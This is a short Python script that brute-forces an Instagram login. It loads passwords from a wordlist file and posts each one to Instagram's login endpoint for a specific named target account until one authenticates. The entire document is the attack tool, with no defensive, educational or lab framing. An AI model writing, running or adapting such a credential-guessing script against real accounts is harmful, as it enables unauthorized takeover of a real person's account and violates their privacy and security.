import requests

# Instagram login URL
login_url = 'https://www.instagram.com/accounts/login/ajax/'

# Target username
target_username = '__cherr__y__'

# Load passwords from a file
with open('pass list.txt', 'r') as file:
    passwords = file.readlines()

# Session to maintain cookies
session = requests.Session()

# Brute-force loop
for password in passwords:
    password = password.strip()
    print(f'Trying password: {password}')
    
    # Login request
    response = session.post(login_url, data={
        'username': target_username,
        'password': password,
    }, headers={
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': 'https://www.instagram.com/accounts/login/',
    })
    
    # Check if login was successful
    if 'authenticated": true' in response.text:
        print(f'[*] Success! Password: {password}')
        break
    else:
        print('[-] Failed.')
